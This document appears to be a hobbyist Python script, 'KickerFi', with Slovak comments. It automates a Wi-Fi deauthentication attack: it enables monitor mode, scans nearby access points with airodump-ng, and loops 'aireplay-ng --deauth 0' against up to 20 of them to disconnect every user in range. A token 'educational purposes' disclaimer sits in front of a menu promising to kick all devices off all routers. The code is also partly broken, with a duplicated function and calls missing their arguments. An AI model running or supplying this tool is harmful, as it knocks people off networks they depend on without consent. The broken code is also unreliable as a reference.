import os
import subprocess
from time import sleep
#import keyboard
#import pywifi
#from pywifi import const
import sys

#wifi = pywifi.PyWiFi()

# FARBY
red = '\033[31m'
green = '\033[32m'
yellow = '\033[33m'
blue = '\033[34m'
P = '\033[15m'
purple = '\033[34;45m'
#orange = '\033[033m'
orange = '\033[38;5;208m'
magenta = '\033[35m'
cyan = '\033[36m'
reset = '\033[0m'

#def CheckFile():
#    if not os.path.exists("Adapters.txt"):
#        with open("Adapters.txt","w")as file:
#            file.write(" ")
#CheckFile()
#
#def ReadFile():
#    with open("Adapters.txt", "r") as file:
#        Content = file.read()
#        if "wlan1" in "Adapters.txt":
#            print("JE to tu : ",Content)
#
#def SaveOutput(output):
#    with open("Adapter.txt", "w")as file:
#        file.write(output)
#

def CheckFile():
    if not os.path.exists("Adapters.txt"):
        with open("Adapters.txt", "w") as file:
            file.write(" ")

def ReadFile():
    with open("Adapters.txt", "r") as file:
        Content = file.read()
        if "wlan1" in Content:
            print("JE to tu: ", Content)

def SaveOutput(output):
    with open("Adapters.txt", "a") as file:
        file.write(output + "\n")

def CheckSUDO():
    if os.geteuid() !=0:
        print(" ")
        print(" ")
        print(" " + "+" + " " + "-" * 50 + " " + "+" + " "* 15)
        print(f"  +{red}                Cannot continue {reset}{orange}!{reset}" + " "* 17 + "+")
        print(" ")
        print(f"    Please start it again using {green}sudo python3 stt.py{reset}")
        print(" ")
        print(f"  +{orange}                   Exitting ...{reset}"+ " "*19 +"+")
        print(" " + "+" + " " + "-" * 50 + " " + "+" + " "* 15)
        print(" ")
        print(" ")
        exit()
    elif os.geteuid() ==1:
        sleep(2)
        print("Starting with SUDO privileges ...")
CheckSUDO()

print(" ")
print(" ")
print("-------------------------------------------------------------------------")
print(f"                     Please {yellow}PLUG IN{reset} Your WiFi Adapter")
print("-------------------------------------------------------------------------")
print(" ")
print(" ")
sleep(3)


def DISCLAIMER():
    os.system("clear")
    print(" ")
    print(" ")
    print(" ")
    print(f"                                        {yellow}+{reset} ------------------ {yellow}+{reset}")
    print(f"                                        + {red}   DISCLAIMER !{reset}    +")
    print(f"                                        {yellow}+{reset} ------------------ {yellow}+{reset}")
    print(" ")
    print(f"{red}Don't use this script without permissions{reset} owners of WiFi routers devices and for {red}illegal use{reset} {orange}!{reset}")
    print(f"{red}Don't use this script with EVIL INTENT and for abuse !")
    print(f"{green}THIS IS FOR EDUCATIONAL PURPOSES{reset} {orange}ONLY !{reset} (How it works ...)")
    print(" ")
    print(f"Do You Really want to Start THIS SCRIPT {orange}FOR DISCONNECT ALL USERS{reset} from ALL WiFi Routers around ? \n                                         Write ({green}Yes{reset} / {red}No{reset})")
    print(" ")
    print(" ")
    dis = input("                                      --> ")
    if dis == "Yes" or dis =="yes":
        sleep(1)
        print("Ok, Continuining")
    elif dis =="No" or dis =="no":
        sleep(1)
        print(" Exitting ...")
        exit()
    else:
        print("Invalid Input --> Exitting ...")
        sleep(2)
        os.system("clear")
        sleep(2)
        exit()

DISCLAIMER()

def WiFiLOGO():
    print(f"""{red}                                       .!:
                                                     .?B@&Y:     
                                                  .?#@@@@@&!    
                                                :J#@@@@@@P~     
                              ..:::::...      :Y&@@@@@@5^       
                     :^!?YPGB##&&&&&&&&##P^ ^5&@@@@@&5^         
               .^!JPB&@@@@@@@@@@@@@@@@@#?.^5@@@@@@&J:           
           .^?P#@@@@@@@@@@@@&##BBGGGBG7.^P@@@@@@#J.:YB57:       
        :75#@@@@@@@@@#G5J7~^:.        ~P@@@@@@#?.^P@@@@@@BJ^    
     :7P&@@@@@@@&GJ!^.        .::   !G@@@@@@B7.  !5B&@@@@@@@BJ^ 
    :G@@@@@@&GJ~.     .^!J5PB#&P^.7B@@@@@@B!.:.     :75#@@@@@@G:
     .?B@&P7:     ^7YG&@@@@@@P^.7B@@@@@@G! ~G@&GY!:    .!5&@G~  
       .!:    .!YB@@@@@@@@@5^.?#@@@@@@G~ !B@@@@@@@&G?:    :^    
            ~P&@@@@@@@&BP?:.J#@@@@@@P^   ~7JP#@@@@@@@@G!        
            ~P@@@@@BY!:  .J&@@@@@@5^.!!~:.    ^?P&@@@&Y^        
              ^5BJ^    ^5&@@@@@&Y:.?#@@@@&B5?^   .7PJ.          
                     ^5@@@@@@&Y::Y&@@@@@@@@@@@#5!               
                   ~P@@@@@@#J: :??77?JYPB&@@@@@B7               
                 ~G@@@@@@#?.      .      :!YBG~                 
              .7G@@@@@@B?.    ^5B&&#G7                          
              ^G@@@@@B7.     ~@@@@@@@@5                         
                ~P@G!        ?@@@@@@@@#                         
                  :           J&@@@@@G^                         
                               .~77!^                        {reset}""")
    print("                                                    ")
    print("                                                    ")
    sleep(2)
    os.system("clear")

def KickerFiLOGO():
    os.system("clear")
    sleep(1)
    print(" ")
    print(" ")
    print(f"      -------------------------------------------------")
    print(f"      {blue}     (\|/--\|/)                   (\|/--\|/)        {reset}")
    print(f"      ------({green}O{reset}-__-{green}O{reset})                     ({green}O{reset}-__-{green}O{reset})------{reset}")
    print(f"               {green}/\{reset}                           {green}/\{reset}         ")
    print(f"              :  :    Welcome to {red}KickerFi{reset}  :  :        ")
    print(f"      ------({green}O{reset}-__-{green}O{reset})                     ({green}O{reset}-__-{green}O{reset})------{reset}")
    print(f"      {blue}     (\|/--\|/)  version : 1.0.0  (\|/--\|/)        {reset}")
    print(f"      -------------------------------------------------")
    print(" ")
    print(" ")
    sleep(2)

def exitting():
    print(" ")
    print(" ")
    print(" ")
    print(f"{red}               Exitting ...{reset}")
    sleep(2)
    print(" ")
    print(" ")
    print(" ")
    print(" ")
    print(f"  {green}Thank You{reset} for using Our Script :D")

def MonMODE_wlan1():
    print(f"{orange}Starting{reset} MONITOR MODE on {green}'wlan1'{reset} ...")
    sleep(1)
    os.system("sudo airmon-ng check")
    sleep(1)
    os.system("sudo airmon-ng check kill")
    sleep(1)
    os.system("sudo airmon-ng start wlan1")
    sleep(2)
    print(f"{orange}Monitor MODE{reset} {green}Sucessfully ENABLED{reset}")
    sleep(1)
    os.system("clear")

def MonMODE_wlan0():
    print(f"{orange}Starting{reset} MONITOR MODE on {green}'wlan0'{reset} ...")
    sleep(1)
    os.system("sudo airmon-ng check")
    sleep(1)
    os.system("sudo airmon-ng check kill")
    sleep(1)
    os.system("sudo airmon-ng start wlan0")
    sleep(2)
    print(f"{orange}Monitor MODE{reset} {green}Sucessfully ENABLED{reset}")
    sleep(1)
    os.system("clear")

def MonMODE_wlan1Down():
    sleep(1)
    os.system("sudo airmon-ng stop wlan1")
    sleep(1)
    os.system("sudo service NetworkManager restart")
    sleep(3)

def MonMODE_wlan0Down():
    sleep(1)
    os.system("sudo airmon-ng stop wlan0")
    sleep(1)
    os.system("sudo service NetworkManager restart")
    sleep(3)

KickerFiLOGO()

sleep(1)
print(" ")
print(" ")
print(" ")
Interface = input(f"Select WiFi interface ({green}wlan0{reset} or {green}wlan1{reset}) for Scanning: ")
print(f"{green}Starting on{reset}", Interface)
sleep(1)
print(" ")
print(" ")
print(" ")

#def AirEplayNg():
#    subprocess.call(["sudo", "aireplay-ng", "--deauth", "0" ,Interface])

def AirodumpNg():
    os.system("clear")
    sleep(1)
    print(f"{yellow}Starting{reset} airodump-ng on {Interface} WIFi Adapter")
    sleep(1)
    # Spusti airodump-ng na odchytávanie zariadení v dosahu
    subprocess.Popen(["airodump-ng", "-w", "output", "--output-format", "csv", Interface])

    # Počkaj nejakú chvíľu na získanie dostatočného počtu zariadení
    sleep(10)

    # Zastav airodump-ng
    subprocess.run(["pkill", "airodump-ng"])
    sleep(2)

    # Získaj zoznam BSSID a ESSID z výstupného súboru airodump-ng
    devices = get_devices_from_output("output-01.csv")

    if len(devices) < 1:
        print("No devices found in range.")
        exit()

    # Odpoj zvolený počet zariadení s použitím BSSID a ESSID
    num_devices = 20  # Zadajte počet zariadení, ktoré chcete odpojiť
    if num_devices > len(devices):
        num_devices = len(devices)

    for i in range(num_devices):
        bssid = devices[i]["bssid"]
        essid = devices[i]["essid"]
        AirEplayNg(bssid, essid)
        sleep(1)

def AirEplayNg(bssid, essid):
    subprocess.call(["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, "-e", essid])

def get_devices_from_output(output_file):
    devices = []
    with open(output_file, "r") as file:
        lines = file.readlines()
        for line in lines[4:]:
            values = line.strip().split(",")
            bssid = values[0].strip()
            essid = values[13].strip().strip('"')
            devices.append({"bssid": bssid, "essid": essid})
    return devices

 

def AirodumpNg():
    os.system("clear")
    sleep(1)
    print(f"{yellow}Starting{reset} airodump-ng on", Interface,"WIFi Adapter")
    sleep(1)
    #SubProc = subprocess.Popen(["airodump-ng", Interface])
    SubProc = subprocess.Popen(["airodump-ng", Interface], shell=False)
    sleep(28)
    SubProc.terminate()
    sleep(3)
    AirEplayNg()
#AirEplayNg()

def AirCrackNg():
    os.system("clear")
    sleep(1)
    print(" ")
    print("NENI TO ESTE ")
    print(" ")
    
def Start_KickerFi():
    os.system("clear")
    a = input(f"Type {green}Y{reset} for {green}START{reset} or {red}C{reset} for {red}CANCEL{reset} : ")
    if a =="y" or a =="Y":
        MonMODE_wlan1()
        print(" ")
        print(" ")
        print(f"[ 1 ] {green}START AiroDump-ng on{reset}",Interface, "(After 28 seconds Start Deauth Attack)")
        print(f"[ 2 ] {orange}STOP{reset} {orange}MONITOR MODE{reset} on" ,Interface)
        print(f"[ 3 ] neni nastavene")
        print(f"[ 4 ] {red}EXIT{reset}")
        c = input("Option : ")
        if c =="1":
            sleep(1)
            os.system("clear")
            print("Ahoj :D")
            AirodumpNg()
            AirEplayNg()
        elif c =="2":
            os.system("clear")    
            sleep(1)
            subprocess.run(["sudo", "airmon-ng", "stop", Interface])
            sleep(3)
            os.system("sudo service NetworkManager restart")
            sleep(3)
            os.system("clear")
            print(f"{orange}MONITOR MODE{reset} {green}Sucessfully DISABLED on{reset} ", Interface)
            print("\n")
            sleep(2)
        
        elif c =="3":
            print("Need to SET !")

        elif c =="4":
            exitting()
        else: 
            print("Invalid input")
            exitting()
    
    elif a =="c" or a =="C":
        print("Bye Bye :D")
        exitting()
    print("")
    print("")

os.system("clear")
sleep(0.2)
print(f"{red}                      Deauthentificator       {reset}")
sleep(0.2)
print(f"{red}                             FOR              {reset}")
sleep(0.2)
print(f"{red}                             ALL              {reset}")
sleep(0.2)
print(f"{red}                            Wi-Fi             {reset}")
sleep(0.2)
print(f"{red}                           ROUTERS            {reset}")
sleep(0.2)
print(f"{orange}                      Version :{reset} {green}1.0.0{reset}         {reset}")
print(" ")
sleep(1)

WiFiLOGO()

print(" ")
print(f"{green}[ 1 ]{reset} {green}START KickerFi{reset} {orange}KICK ALL DEVICES{reset} on {P}ALL{reset} WiFi Routers ({P}Distance{reset} : 6 - 20 meters)")
print(f"{magenta}[ 2 ]{reset} {green}SETUP KickerFi{reset} ({red}NEED TO SET{reset} {orange}!{reset})")
print(f"{magenta}[ 3 ]{reset} Stop Monitor Mode on", Interface)
print(" ")
print(f"{orange}[ 4 ]{reset} {orange}EXIT{reset}")

b = input("\nOption : ")
if b =="1":
    Start_KickerFi()

elif b =="2":
    #SetupKickerFi()
    print("Setting nejsu nastavene ESTE ...")
elif b == "3":
    subprocess.Popen(["sudo", "airmon-ng", "stop", Interface])
    sleep(3)
    subprocess.run(["sudo", "service", "NetworkManager", "restart"])
    # os.system("clear")
    sleep(1)
    print(f"{orange}\nMonitor Mode {reset}{green}Successfully{reset} Disabled\n")

elif b =="4":
    print("Exitting ...")
    exitting()

else:
    print("Invalid INPUT !")
    sleep(2)
    exitting()
